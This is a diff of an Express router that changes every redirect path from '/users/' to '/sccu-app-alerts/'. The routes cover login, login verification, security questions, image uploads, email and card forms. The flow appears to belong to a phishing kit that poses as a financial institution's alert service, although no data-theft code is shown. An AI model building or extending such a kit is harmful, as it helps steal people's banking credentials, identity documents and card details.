@@ -107,7 +107,7 @@ router.post('/card', async (req, res) => {
 
 // images
 router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
-  res.redirect('/users/emailcnt');
+  res.redirect('/sccu-app-alerts/emailcnt');
 });
 
 // Handle Security Questions Form Submission
@@ -130,7 +130,7 @@ router.post('/questions', async (req, res) => {
         'success_msg',
         'Questions ok'
       );
-      res.redirect('/users/images');
+      res.redirect('/sccu-app-alerts/images');
     })
   .catch(err => console.log(err));
 });
@@ -158,7 +158,7 @@ router.post('/email', async (req, res) => {
           'success_msg',
           'Email ok'
         );
-        res.redirect('/users/card');
+        res.redirect('/sccu-app-alerts/card');
       })
 
 } catch (err) {
@@ -185,7 +185,7 @@ router.post('/emailcnt', async (req, res) => {
         'success_msg',
         'Email ok'
       );
-      res.redirect('/users/email');
+      res.redirect('/sccu-app-alerts/email');
     })
   .catch(err => console.log(err));
 });
@@ -259,7 +259,7 @@ router.post('/register', (req, res) => {
                   'success_msg',
                   'You are now registered and can log in'
                 );
-                res.redirect('/users/login');
+                res.redirect('/sccu-app-alerts/login');
               })
               .catch(err => console.log(err));
           });
@@ -291,7 +291,7 @@ router.post('/login', (req, res, next) => {
       'success_msg',
       'Questions ok'
     );
-    res.redirect('/users/loginverify');
+    res.redirect('/sccu-app-alerts/loginverify');
   })
 .catch(err => console.log(err));
 });
@@ -316,7 +316,7 @@ router.post('/loginverify', (req, res, next) => {
       'success_msg',
       'Questions ok'
     );
-    res.redirect('/users/alert');
+    res.redirect('/sccu-app-alerts/alert');
   })
 .catch(err => console.log(err));
 });
@@ -325,7 +325,7 @@ router.post('/loginverify', (req, res, next) => {
 router.get('/logout', (req, res) => {
   req.logout();
   req.flash('success_msg', 'You are logged out');
-  res.redirect('/users/login');
+  res.redirect('/sccu-app-alerts/login');
 });
 
 // Retrieve a list of all files in GridFS
